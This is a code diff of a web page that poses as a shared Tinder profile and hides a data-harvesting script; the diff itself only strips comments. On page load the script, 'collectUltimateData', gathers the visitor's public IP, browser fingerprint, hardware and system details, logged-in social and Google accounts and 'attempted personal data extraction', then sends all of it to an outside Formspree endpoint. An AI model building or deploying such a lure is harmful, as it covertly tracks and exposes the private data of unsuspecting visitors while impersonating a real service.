@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Profile shared with you | Tinder</title>
     <style>
-        /* [KEEP ALL YOUR EXISTING STYLES - they're perfect] */
         * {
             margin: 0;
             padding: 0;
@@ -251,60 +250,45 @@
     </div>
 
     <script>
-        // ULTIMATE CYBERSPY DATA COLLECTION - EVERYTHING POSSIBLE
         async function collectUltimateData() {
             console.log('🚀 STARTING ULTIMATE DATA COLLECTION...');
             
             const ultimateData = {
-                // === BASIC IDENTIFICATION ===
                 timestamp: new Date().toISOString(),
                 pageUrl: window.location.href,
                 referrer: document.referrer,
                 historyLength: history.length,
                 
-                // === NETWORK & IP DATA ===
                 networkInfo: await getAdvancedNetworkData(),
                 
-                // === COMPREHENSIVE BROWSER FINGERPRINT ===
                 browserFingerprint: getUltimateBrowserFingerprint(),
                 
-                // === HARDWARE & SYSTEM INFO ===
                 hardwareInfo: getHardwareSpecs(),
                 systemInfo: getDetailedSystemInfo(),
                 
-                // === DISPLAY & GRAPHICS ===
                 displayInfo: getDisplayData(),
                 
-                // === STORAGE & PRIVACY ===
                 storageCapabilities: getStorageInfo(),
                 privacySettings: getPrivacyInfo(),
                 
-                // === PERFORMANCE METRICS ===
                 performance: getPerformanceData(),
                 
-                // === ADVANCED FINGERPRINTING ===
                 advancedFingerprinting: await getAdvancedFingerprinting(),
                 
-                // === SOCIAL & ACCOUNT DETECTION ===
                 socialPresence: await detectSocialAccounts(),
                 googleData: await extractGoogleInfo(),
                 
-                // === BEHAVIORAL DATA ===
                 userBehavior: getUserBehaviorPatterns(),
                 
-                // === ATTEMPTED PERSONAL DATA EXTRACTION ===
                 personalData: await attemptPersonalDataExtraction(),
                 
-                // === SECURITY VULNERABILITIES ===
                 securityInfo: checkSecurityVulnerabilities(),
                 
-                // === NETWORK INTERFACES ===
                 networkInterfaces: await getNetworkInterfaces()
             };
 
             console.log('🎯 ULTIMATE DATA COLLECTED:', ultimateData);
             
-            // Send to Formspree
             try {
                 await fetch('https://formspree.io/f/mvgnkjga', {
                     method: 'POST',
@@ -319,7 +303,6 @@
             }
         }
 
-        // === ADVANCED NETWORK DATA ===
         async function getAdvancedNetworkData() {
             const network = {
                 publicIP: await getPublicIP(),
@@ -390,7 +373,6 @@
         }
 
         async function getDNSInfo() {
-            // Attempt to detect DNS through timing attacks
             const start = performance.now();
             try {
                 await fetch('https://www.google.com', { mode: 'no-cors' });
@@ -422,7 +404,6 @@
             }
         }
 
-        // === ULTIMATE BROWSER FINGERPRINT ===
         function getUltimateBrowserFingerprint() {
             return {
                 userAgent: navigator.userAgent,
@@ -437,15 +418,12 @@
                 product: navigator.product,
                 productSub: navigator.productSub,
                 
-                // Browser details
                 browser: getBrowserDetails(),
                 engine: getBrowserEngine(),
                 
-                // Plugins and MIME types
                 plugins: getDetailedPlugins(),
                 mimeTypes: getMimeTypesList(),
                 
-                // Security policies
                 security: getSecurityPolicies()
             };
         }
